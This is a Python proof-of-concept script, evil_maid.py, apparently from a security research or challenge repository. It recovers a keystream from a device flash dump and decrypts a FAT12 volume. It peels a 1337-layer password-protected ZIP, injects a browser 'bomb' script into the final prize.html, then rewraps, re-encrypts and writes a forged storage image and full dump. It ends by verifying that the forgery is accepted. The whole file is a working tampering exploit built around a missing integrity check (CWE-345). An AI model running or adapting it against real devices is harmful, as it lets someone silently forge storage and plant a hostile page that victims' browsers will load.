#!/usr/bin/env python3
"""Replace the prize page in a decrypted FAT12 volume and re-encrypt the volume

The script reuses attack3 recovery and preserves the ZIP layer passwords
The default mode writes storage and full flash images; the bounded mode writes a prize ZIP
See attack2/README.md for delivery paths and the limits of the browser payload proof
"""
import os
import shutil
import subprocess
import sys
import tempfile
import zipfile

sys.path.insert(0, os.path.join(os.path.dirname(os.path.abspath(__file__)), "..", "..", "attack3", "src"))
import recover_keystream as R  # noqa: E402  (shared cipher math, single source)
import matryoshka as M         # noqa: E402
import bomb_html               # noqa: E402
import browser_demo            # noqa: E402


def _mtool(*args):
    r = subprocess.run(args, capture_output=True, text=True)
    if r.returncode != 0:
        raise RuntimeError(f"{' '.join(args)} -> rc {r.returncode}\n{r.stderr[-300:]}")
    return r.stdout


def build_evil_prize(work, orig_prize_zip, bounded_copies=None):
    """Replace the final page and rebuild the original password-protected layers.

    Returns the archive path, layer depth, original page size, and payload size.
    """
    with zipfile.ZipFile(orig_prize_zip) as z:
        names = z.namelist()
        z.extractall(work)
    layers_zip = os.path.join(work, "layers.zip")

    peel = os.path.join(work, "peel")
    os.makedirs(peel)
    final_path, depth = M.unwrap(peel, layers_zip)
    orig_final_size = os.path.getsize(final_path)

    with open(final_path, "rb") as final:
        original = final.read()
    injected = (bomb_html.inject_bomb(original) if bounded_copies is None
                else browser_demo.bounded_page(original, bounded_copies))
    with open(final_path, "wb") as f:
        f.write(injected)

    new_layers = M.rewrap(peel, final_path, depth)
    os.replace(new_layers, layers_zip)

    new_prize = os.path.join(work, "your_prize_evil.zip")
    with zipfile.ZipFile(new_prize, "w", zipfile.ZIP_DEFLATED) as z:
        for name in names:
            z.write(os.path.join(work, name), arcname=name)
    return new_prize, depth, orig_final_size, len(injected)


def main(argv):
    if len(argv) > 1 and argv[1] == "--bounded-archive":
        if len(argv) != 5:
            print("Usage: evil_maid.py --bounded-archive <source_prize.zip> <output.zip> <copies>",
                  file=sys.stderr)
            return 2
        source, output = argv[2:4]
        try:
            copies = int(argv[4])
            if not 1 <= copies <= 16:
                raise ValueError("Copy limit must be between 1 and 16")
            if os.path.exists(output) or os.path.islink(output):
                raise FileExistsError(f"Output already exists: {output}")
            with tempfile.TemporaryDirectory() as work:
                archive, depth, _, size = build_evil_prize(work, source, bounded_copies=copies)
                with open(archive, "rb") as payload, open(output, "xb") as target:
                    shutil.copyfileobj(payload, target)
            print(f"Saved: {output} ({depth} encrypted layers, {size} HTML bytes, {copies} bounded copies)")
        except (OSError, ValueError, RuntimeError, zipfile.BadZipFile) as error:
            print(f"Archive build failed: {error}", file=sys.stderr)
            return 1
        return 0
    if len(argv) < 2:
        print(__doc__)
        return 2
    dump = open(argv[1], "rb").read()
    out_path = argv[2] if len(argv) > 2 else "forged_storage.bin"

    ct = dump[R.STORAGE_OFF:R.STORAGE_OFF + R.STORAGE_LEN]
    if len(ct) < R.STORAGE_LEN:
        print(f"[!] dump too short: need storage at 0x{R.STORAGE_OFF:x}+0x{R.STORAGE_LEN:x}")
        return 2

    print("[*] recovering keystream from the cold dump (attack3 engine)...")
    res = R.recover(ct)
    if res is None:
        print("[FAIL] keystream recovery did not converge")
        return 1
    A, seed, B, W = res
    print(f"    B=0x{B:08X} W=0x{W:08X} A=0x{A:08X} seed=0x{seed:08X}")

    pt = R.decrypt_all(ct, A, seed, B, W)

    with tempfile.TemporaryDirectory() as work:
        img = os.path.join(work, "volume.img")
        with open(img, "wb") as f:
            f.write(pt)

        orig_prize = os.path.join(work, "your_prize.zip")
        _mtool("mcopy", "-i", img, "::your_prize.zip", orig_prize)

        print("[*] peeling 1337 layers and injecting the bomb into the final prize.html...")
        new_prize, depth, orig_final, injected_sz = build_evil_prize(work, orig_prize)
        print(f"    depth={depth} layers; prize.html {orig_final} -> {injected_sz} bytes "
              f"(same markup + injected script)")

        _mtool("mdel", "-i", img, "::your_prize.zip")
        _mtool("mcopy", "-i", img, new_prize, "::your_prize.zip")

        pt2 = open(img, "rb").read()

    ct2 = R.decrypt_all(pt2, A, seed, B, W)
    forged_dump = bytearray(dump)
    forged_dump[R.STORAGE_OFF:R.STORAGE_OFF + R.STORAGE_LEN] = ct2

    with open(out_path, "wb") as f:
        f.write(ct2)
    dump_out = out_path.rsplit(".", 1)[0] + "_fulldump.bin"
    with open(dump_out, "wb") as f:
        f.write(forged_dump)
    print(f"[*] wrote forged storage: {out_path} ({len(ct2)} bytes)")
    print(f"[*] wrote forged full dump: {dump_out} ({len(forged_dump)} bytes)")

    ok = _verify(ct2, A, seed, B, W)
    print(f"[{'PASS' if ok else 'FAIL'}] offline decryption accepts the forged volume; "
          f"layers and injected page remain readable (CWE-345)")
    return 0 if ok else 1


def _verify(ct2, A, seed, B, W):
    pt = R.decrypt_all(ct2, A, seed, B, W)
    with tempfile.TemporaryDirectory() as work:
        img = os.path.join(work, "v.img")
        with open(img, "wb") as f:
            f.write(pt)
        listing = _mtool("mdir", "-i", img, "::")
        if "YOUR_P" not in listing.upper():
            print("    [verify] your_prize.zip missing from volume")
            return False
        prize = os.path.join(work, "your_prize.zip")
        _mtool("mcopy", "-i", img, "::your_prize.zip", prize)
        with zipfile.ZipFile(prize) as z:
            z.extractall(work)
        peel = os.path.join(work, "peel")
        os.makedirs(peel)
        final_path, depth = M.unwrap(peel, os.path.join(work, "layers.zip"))
        body = open(final_path, "rb").read()
        is_bomb = b"DecompressionStream" in body and b"SEED_B64" in body
        looks_original = b"<img" in body.lower()
        print(f"    [verify] {depth} layers open with passwords 1..{depth}; "
              f"final {os.path.basename(final_path)}: bomb={is_bomb}, original markup kept={looks_original}")
        return is_bomb and looks_original


if __name__ == "__main__":
    sys.exit(main(sys.argv))
